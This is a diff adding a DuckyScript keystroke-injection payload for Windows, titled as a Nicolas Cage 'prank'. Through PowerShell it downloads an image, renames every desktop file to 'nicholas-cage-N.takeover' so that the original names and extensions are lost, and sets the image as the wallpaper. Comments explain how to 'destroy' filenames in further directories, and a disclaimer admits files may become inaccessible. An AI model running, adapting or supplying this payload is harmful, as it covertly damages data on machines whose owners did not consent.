@@ -1,0 +1,56 @@
+REM Title: A_Cagey_Takeover
+REM Author: the-jcksn
+REM Description: Nicolas Cage themed Prank - Renames all files on desktop as "nicholas-cage-1.takeover", incrementing the digit. Then sets background image to nicholas cage breaking through the screen. Can be expanded to remane files in further directories if required.
+REM Target: Windows / Powershell
+REM Version: 1.0
+REM Category: Prank
+
+REM ~~~~~ TO DESTROY FURTHER FILENAMES: Copy everything from line 23 to 28, and paste in the space provided, changing the target directory name.
+REM ~~~~~ CAN RUN SCRIPT 'AS IS' (WITHOUT CHANGES) - Will just attack files on the desktop
+REM ~~~~~ Use responsibly and within the confines of the law. This script renames files AND extensions and can result in being unable to access files if you don't know which file was which. I accept no responsibility for any loss of files or any other consequences. Use at your own risk. 
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 200
+STRING Invoke-WebRequest -Uri https://wallpapercave.com/wp/GVO9gKu.jpg -OutFile Desktop\nickcage.jpg
+ENTER
+DELAY 1000
+
+REM ~~~~~~~~~~ REPEAT THE BELOW LINES IF YOU WANT TO NICK TO TAKEOVER FURTHER DIRECTORIES, CHANGING "cd Desktop" TO THE DIRECTORY REQUIRED ~~~~~~~~~~
+
+STRING cd Desktop
+ENTER
+DELAY 200
+STRING  dir | %{Rename-Item $_ -NewName ("nicholas-cage-{0}.takeover" -f $nr++)}
+ENTER
+DELAY 200
+
+REM ~~~~~~~~~~ END OF LINES TO REPEAT ~~~~~~~~~~
+
+REM            SPACE TO PASTE FURTHER TAKEOVERS (YOU CAN DELETE THIS LINE IF DESIRED)
+
+REM ~~~~~~~~~~ BACK TO BUSINESS, DONT CHANGE ANYTHING BELOW THIS ~~~~~~~~~~
+STRING exit
+ENTER
+DELAY 200
+GUI r
+DELAY 200
+STRING Desktop
+ENTER
+DELAY 200
+CTRL f
+DELAY 500
+STRING nickcage
+ENTER
+DELAY 800
+TAB
+DELAY 200
+SPACE
+DELAY 200
+MENU
+DELAY 200
+STRING b
+DELAY 200
+ALT F4
